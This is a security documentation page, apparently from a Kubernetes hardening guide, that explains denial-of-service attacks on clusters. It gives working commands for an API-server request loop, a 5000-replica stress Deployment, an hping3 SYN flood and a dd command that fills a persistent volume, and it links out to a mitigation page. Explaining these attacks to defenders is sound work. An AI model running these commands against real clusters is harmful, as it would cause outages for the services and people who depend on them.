---
sidebar_position: 9
title: "Denial of Service (DoS) Attacks"
description: "How attackers exploit Kubernetes resources to exhaust system capacity, disrupt workloads, and cause service outages."
keywords: [kubernetes security, denial of service, DoS attack, resource exhaustion, resource limits, kubernetes DDoS, pod disruption, cluster availability, resource quotas, limit ranges]
---

# Denial of Service (DoS) Attacks

A **Denial of Service (DoS) attack** targets a Kubernetes cluster by exhausting system resources, overloading the API server, or overwhelming network capacity. These attacks can lead to service downtime, degraded performance, or total cluster unavailability.

---

## Exploitation Steps

### 1. Flood the Kubernetes API Server

An attacker sends repeated API requests to overload the control plane:

```bash
while true; do kubectl get pods --all-namespaces; done
```

If unauthenticated or loosely authenticated access is permitted, the API server experiences high latency and dropped requests.

---

### 2. Deploy Resource-Exhausting Pods

Without Pod resource limits, the attacker creates high-load containers to consume CPU and memory:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: overload-pods
spec:
  replicas: 5000
  template:
    spec:
      containers:
        - name: stress-container
          image: polinux/stress
          command: ["stress"]
          args:
            [
              "--cpu",
              "4",
              "--io",
              "4",
              "--vm",
              "4",
              "--vm-bytes",
              "128M",
              "--timeout",
              "300s",
            ]
```

```bash
kubectl apply -f overload-pods.yaml
```

This can starve other workloads and destabilize the cluster.

---

### 3. Exploit Missing Network Policies

If no Network Policies are enforced, an attacker can flood internal services:

```bash
hping3 -S -p 443 <service-ip> --flood
```

This overwhelms the service backend, resulting in dropped connections and timeout errors.

---

### 4. Abuse Persistent Storage

If storage usage is not constrained, the attacker fills up a PersistentVolume:

```bash
dd if=/dev/zero of=/mnt/persistent-volume/attack bs=1M count=100000
```

Full disk usage disrupts stateful workloads relying on persistent storage.

---

### Result

The attacker causes **resource exhaustion, service unavailability, latency spikes, and application crashes**. Without proper controls, even a low-privileged user can perform widespread denial of service.

---

## Mitigation

➡ [Mitigating DoS Attacks in Kubernetes](/docs/best_practices/cluster_setup_and_hardening/network_security/ddos_mitigation)
